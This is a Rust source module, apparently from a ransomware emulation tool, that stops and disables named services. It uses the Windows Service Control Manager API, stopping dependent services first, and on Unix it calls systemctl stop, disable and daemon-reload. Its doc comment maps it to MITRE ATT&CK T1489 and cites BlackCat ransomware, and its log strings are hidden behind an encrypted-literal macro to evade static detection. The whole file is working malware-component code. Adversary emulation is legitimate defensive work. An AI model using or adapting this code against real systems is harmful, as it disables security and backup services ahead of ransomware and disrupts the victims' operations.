#[cfg(target_os = "windows")]
use {
    windows::Win32::System::Services::{
        CloseServiceHandle, ControlService, EnumDependentServicesW, 
        OpenSCManagerW, OpenServiceW, QueryServiceStatusEx,
        ENUM_SERVICE_STATUSW, ENUM_SERVICE_TYPE, SC_MANAGER_ALL_ACCESS,
        SC_STATUS_PROCESS_INFO, SERVICE_ACTIVE, SERVICE_CONTROL_STOP,
        SERVICE_ENUMERATE_DEPENDENTS, SERVICE_QUERY_STATUS, SERVICE_STATUS,
        SERVICE_STATUS_CURRENT_STATE, SERVICE_STATUS_PROCESS, SERVICE_STOP,
        SERVICE_STOPPED,  SERVICE_STOP_PENDING, SERVICES_ACTIVE_DATABASE,
    },
    windows::Win32::Foundation::{ERROR_MORE_DATA, ERROR_SERVICE_DOES_NOT_EXIST},
    windows::Win32::Security::SC_HANDLE,
    windows::core::PCWSTR,
    crate::winapi_helper::to_wstring,
    crate::logger::log_debug,
};

#[cfg(unix)]
use {
    crate::proc::exec_program_and_log_output,
};

use crate::logger::{log_info, log_error};
use encryptliterals::esl;

// Reference: https://learn.microsoft.com/en-us/windows/win32/services/stopping-a-service
#[cfg(target_os = "windows")]
unsafe fn stop_service(h_scm: SC_HANDLE, service_name: &String) {
    // Get handle to service
    let svc_name_wstr = to_wstring(service_name);
    let h_svc = match OpenServiceW(h_scm, PCWSTR::from_raw(svc_name_wstr.as_ptr()), SERVICE_QUERY_STATUS | SERVICE_STOP | SERVICE_ENUMERATE_DEPENDENTS) {
        Ok(h) => {
            if h.is_invalid() {
                log_error(format!("{} {}", esl!("OpenServiceW returned invalid handle for service "), service_name));
                return;
            } else {
                h
            }
        },
        Err(e) => {
            if e.code().0 == ERROR_SERVICE_DOES_NOT_EXIST.to_hresult().0 {
                log_info(format!("{} {}", service_name, esl!("service does not exist. Skipping")));
            } else {
                log_error(format!("{} {}: {}", esl!("Failed to open service"), service_name, e));
            }
            return;
        }
    };

    // Check if service is already stopped
    log_debug(format!("{} {}", esl!("Checking status for service"), service_name));
    let mut buffer = vec![0u8; std::mem::size_of::<SERVICE_STATUS_PROCESS>() as usize];
    let mut bytes_needed = 0u32;
    let mut ssp: SERVICE_STATUS_PROCESS = match QueryServiceStatusEx(
        h_svc,
        SC_STATUS_PROCESS_INFO,
        Some(&mut buffer),
        &mut bytes_needed
    ) {
        Ok(_) => {
            std::ptr::read(buffer.as_ptr() as *const _)
        },
        Err(e) => {
            log_error(format!("{} {}.", esl!("Failed to call QueryServiceStatusEx: Error code"), e.code().0));
            let _ = CloseServiceHandle(h_svc);
            return;
        }
    };
    if ssp.dwCurrentState == SERVICE_STOPPED {
        log_info(format!("{} {}", service_name, esl!("service is already stopped. Skipping.")));
        let _ = CloseServiceHandle(h_svc);
        return;
    } else if ssp.dwCurrentState == SERVICE_STOP_PENDING {
        // If stop is currently pending, wait between 1 to 10 seconds, depending on wait hint
        log_debug(format!("{} {}", service_name, esl!("service is already pending stop. Waiting.")));
        let wait_time: u64 = {
            let interval = ssp.dwWaitHint / 10;
            if interval < 1000 {
                1000
            } else if interval > 10000 {
                10000
            } else {
                interval as u64
            }
        };
        std::thread::sleep(std::time::Duration::from_millis(wait_time));

        ssp = match QueryServiceStatusEx(
            h_svc,
            SC_STATUS_PROCESS_INFO,
            Some(&mut buffer),
            &mut bytes_needed
        ) {
            Ok(_) => {
                std::ptr::read(buffer.as_ptr() as *const _) 
            },
            Err(e) => {
                log_error(format!("{} {}.", esl!("Failed to call QueryServiceStatusEx after service stop wait: Error code"), e.code().0));
                let _ = CloseServiceHandle(h_svc);
                return;
            }
        };

        if ssp.dwCurrentState == SERVICE_STOPPED {
            log_info(format!("{} {}", service_name, esl!("service stopped successfully.")));
        } else {
            log_error(format!("{} {}", service_name, esl!("service stop timed out.")));
        }
    } else {
        // Service needs to be stopped. Stop dependent services first.
        stop_dependent_svcs(h_scm, h_svc, service_name);

        // Send stop code to service
        let mut service_status = SERVICE_STATUS {
            dwServiceType: ENUM_SERVICE_TYPE{0: 0},
            dwCurrentState: SERVICE_STATUS_CURRENT_STATE{0: 0},
            dwControlsAccepted: 0u32,
            dwWin32ExitCode: 0u32,
            dwServiceSpecificExitCode: 0u32,
            dwCheckPoint: 0u32,
            dwWaitHint: 0u32,
        };
        log_debug(format!("{} {}", esl!("Sending stop code to service"), service_name));
        match ControlService(h_svc, SERVICE_CONTROL_STOP, &mut service_status) {
            Ok(_) => {
                log_debug(String::from(esl!("Sent stop code. Waiting for stop.")));

                // Wait for service to stop
                if service_status.dwCurrentState != SERVICE_STOPPED {
                    let wait_time: u32 = {
                        if service_status.dwWaitHint < 1000 {
                            1000
                        } else if service_status.dwWaitHint > 10000 {
                            10000
                        } else {
                            service_status.dwWaitHint
                        }
                    };
                    wait_for_svc_stop(h_svc, wait_time, 30000); // 30 second max timeout
                } else {
                    log_debug(String::from(esl!("Service stopped successfully.")));
                }
            },
            Err(e) => {
                log_error(format!("{} {}.", esl!("Failed to call ControlService: Error code"), e.code().0));
                let _ = CloseServiceHandle(h_svc);
                return;
            }
        }
    }
    let _ = CloseServiceHandle(h_svc);
}

// Reference: https://learn.microsoft.com/en-us/windows/win32/services/stopping-a-service
#[cfg(target_os = "windows")]
unsafe fn wait_for_svc_stop(h_svc: SC_HANDLE, wait_hint: u32, max_wait_ms: u32) {
    let mut total_time_waited = 0u32;
    let mut buffer = vec![0u8; std::mem::size_of::<SERVICE_STATUS_PROCESS>() as usize];
    let mut bytes_needed = 0u32;
    while total_time_waited < max_wait_ms {
        std::thread::sleep(std::time::Duration::from_millis(wait_hint as u64));
        total_time_waited += wait_hint;
        match QueryServiceStatusEx(h_svc, SC_STATUS_PROCESS_INFO, Some(&mut buffer), &mut bytes_needed) {
            Ok(_) => {
                let ssp: SERVICE_STATUS_PROCESS = std::ptr::read(buffer.as_ptr() as *const _);
                if ssp.dwCurrentState == SERVICE_STOPPED {
                    log_debug(String::from(esl!("Service stopped successfully.")));
                    return;
                }
            },
            Err(e) => {
                log_error(format!("{} {}.", esl!("Failed to wait for service. QueryServiceStatusEx error code"), e.code().0));
                return;
            }
        }
    }
}

// Reference: https://learn.microsoft.com/en-us/windows/win32/services/stopping-a-service
#[cfg(target_os = "windows")]
unsafe fn stop_dependent_svcs(h_scm: SC_HANDLE, h_svc: SC_HANDLE, service_name: &String) {
    log_debug(format!("{} {}", esl!("Enumerating dependent services for service"), service_name));

    // Get required buffer size
    let mut bytes_needed = 0u32;
    let mut num_svcs = 0u32;
    match EnumDependentServicesW(h_svc, SERVICE_ACTIVE, None, 0, &mut bytes_needed, &mut num_svcs) {
        Ok(_) => {
            // If the API call succeeds with 0-length buffer, then there are no dependent services
            log_debug(format!("{} {}", service_name, esl!("has no dependent services to stop.")));
            return;
        },
        Err(e) => {
            if e.code().0 != ERROR_MORE_DATA.to_hresult().0 {
                log_error(format!("{}: {}", esl!("EnumDependentServicesW call failed with unexpected error code"), e));
                return;
            }
        }
    }

    // Allocate buffer and get dependency information
    let mut buffer = vec![0u8; bytes_needed as usize];
    match EnumDependentServicesW(h_svc, SERVICE_ACTIVE, Some(buffer.as_mut_ptr() as *mut ENUM_SERVICE_STATUSW), bytes_needed, &mut bytes_needed, &mut num_svcs) {
        Ok(_) => {},
        Err(e) => {
            log_error(format!("{}: {}", esl!("EnumDependentServicesW call failed (second time). Error code"), e));
            return;
        }
    }
    log_debug(format!("{} {} {}", esl!("Found"), num_svcs, esl!("dependent services.")));
    let start_ptr = buffer.as_mut_ptr() as *const ENUM_SERVICE_STATUSW;
    for i in 0..num_svcs {
        // Stop dependent services
        let ess_ptr = start_ptr.add(i as usize) as *mut ENUM_SERVICE_STATUSW;
        let dep_svc_name = match (*ess_ptr).lpServiceName.to_string() {
            Ok(s) => s,
            Err(e) => {
                log_error(format!("{}: {}", esl!("Failed to convert name to string for dependent service"), e));
                continue;
            }
        };
        log_debug(format!("{} {}", esl!("Handling dependent service"), dep_svc_name));
        stop_service(h_scm, &dep_svc_name);
    }
}

/**
* terminate_services
*      About:
*          Terminates specified Windows or Linux services
*      Result:
*          Terminated services that match those found in <service_list>
*      MITRE ATT&CK Techniques:
*          T1489: Service Stop
*      CTI:
*          https://www.varonis.com/blog/blackcat-ransomware
*/
pub fn terminate_services(service_list: &Vec<String>) {
    log_info(format!("{} {:?}", esl!("Trying to kill services"), service_list));

    #[cfg(target_os = "windows")] {
        // Reference: https://learn.microsoft.com/en-us/windows/win32/services/stopping-a-service
        let h_scm = unsafe {
            match OpenSCManagerW(
                PCWSTR::null(), // local machine
                SERVICES_ACTIVE_DATABASE,
                SC_MANAGER_ALL_ACCESS
            ) {
                Ok(h) => {
                    if h.is_invalid() {
                        log_error(String::from(esl!("OpenSCManagerW returned invalid handle.")));
                        return;
                    } else {
                        h
                    }
                },
                Err(e) => {
                    log_error(format!("{}: {}", esl!("Failed to connect to the local Service Control Manager"), e));
                    return;
                }
            }
        };
        log_debug(String::from(esl!("Connected to local Service Control Manager.")));

        for service_name in service_list {
            unsafe { stop_service(h_scm, service_name) };
        }

        let _ = unsafe { CloseServiceHandle(h_scm) };
    }

    #[cfg(unix)] {
        for service_name in service_list {
            log_info(format!("{} {}", esl!("Stopping service"), service_name));
            match exec_program_and_log_output(esl!("systemctl").as_str(), &[esl!("stop").as_str(), &service_name]) {
                Ok(_) => log_info(format!("{} {}", esl!("Stopped service"), service_name)),
                Err(e) => {
                    log_error(format!("{} {}: {}", esl!("Failed to execute systemctl to stop service"), service_name, e));
                    continue;
                }
            };

            log_info(format!("{} {}", esl!("Disabling service"), service_name));
            match exec_program_and_log_output(esl!("systemctl").as_str(), &[esl!("disable").as_str(), &service_name]){
                Ok(_) => log_info(format!("{} {}", esl!("Disabled service"), service_name)),
                Err(e) => {
                    log_error(format!("{} {}: {}", esl!("Failed to execute systemctl to disable service"), service_name, e));
                    continue;
                }
            };
        }

        log_info(String::from(esl!("Refreshing systemd")));
        match exec_program_and_log_output(esl!("systemctl").as_str(), &[esl!("daemon-reload").as_str()]){
            Ok(_) => log_info(String::from(esl!("Refreshed systemd"))),
            Err(e) => {
                log_error(format!("{}: {}", esl!("Failed to refresh systemd"), e));
            }
        };
    }

    log_info(String::from(esl!("Finished terminating services.")));
}

